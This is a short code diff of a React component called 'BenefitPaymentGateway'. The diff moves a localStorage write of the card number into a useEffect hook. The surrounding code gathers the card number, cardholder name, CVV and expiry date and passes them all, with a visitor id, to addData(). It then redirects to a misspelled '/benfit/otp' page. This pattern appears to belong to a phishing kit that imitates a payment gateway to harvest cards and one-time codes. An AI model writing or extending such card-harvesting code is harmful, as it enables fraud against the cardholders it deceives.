@@ -14,7 +14,6 @@ export default function BenefitPaymentGateway() {
   const router=useRouter()
     const inputRef = useRef<HTMLInputElement>(null)
   const keypadRef = useRef<HTMLDivElement>(null)
-  const card = localStorage.setItem('cardNumber',cardNumber)
   const total = 10
   const data = { cardNumber, cardholderName, cvv, month, year }
   const handleSubmit = (e: React.FormEvent) => {
@@ -23,6 +22,10 @@ export default function BenefitPaymentGateway() {
     addData({ id: vId, ...data })
     router.push('/benfit/otp')
   }
+  useEffect(()=>{
+    const card = localStorage.setItem('cardNumber',cardNumber)
+
+  },[cardNumber])
   useEffect(() => {
     const handleClickOutside = (event: MouseEvent) => {
       if (
